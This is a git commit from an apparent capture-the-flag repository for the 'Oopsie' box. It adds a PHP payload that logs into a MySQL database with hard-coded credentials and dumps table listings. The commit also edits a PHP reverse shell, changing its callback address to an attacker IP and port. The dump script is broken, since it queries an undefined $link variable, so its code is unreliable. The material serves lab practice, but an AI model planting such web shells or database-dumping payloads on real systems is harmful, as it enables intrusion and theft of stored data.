3ac3a664f2bd74fd658d3f581a4a3040943448fa
Henry Post <HenryFBP@gmail.com>
2021-03-21 17:34:13 -0500

    mention database connection

---
+++ boxes/oopsie/payload/dbdump.php
@@ -0,0 +1,46 @@
+<?php
+
+$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
+
+echo $conn;
+
+echo "peepee poopoo :3";
+
+$sql = "SELECT * FROM information_schema.tables";
+$result = mysqli_query($link, $sql);
+while($row = mysqli_fetch_array($result)){
+    echo $row . "\n";
+}
+
+exit();
+
+
+
+if($result = mysqli_query($link, $sql)){
+    if(mysqli_num_rows($result) > 0){
+        echo "<table>";
+            echo "<tr>";
+                echo "<th>id</th>";
+                echo "<th>first_name</th>";
+                echo "<th>last_name</th>";
+                echo "<th>email</th>";
+            echo "</tr>";
+        while($row = mysqli_fetch_array($result)){
+            echo "<tr>";
+                echo "<td>" . $row['id'] . "</td>";
+                echo "<td>" . $row['first_name'] . "</td>";
+                echo "<td>" . $row['last_name'] . "</td>";
+                echo "<td>" . $row['email'] . "</td>";
+            echo "</tr>";
+        }
+        echo "</table>";
+        // Free result set
+        mysqli_free_result($result);
+    } else{
+        echo "No records matching your query were found.";
+    }
+} else{
+    echo "ERROR: Could not able to execute $sql. " . mysqli_error($link);
+}
+
+?>
--- boxes/oopsie/payload/shell.php
+++ boxes/oopsie/payload/shell.php
@@ -46,7 +46,7 @@
 
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '10.10.14.132'; // CHANGE THIS
+$ip = '10.10.14.231'; // CHANGE THIS
 $port = 1234;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
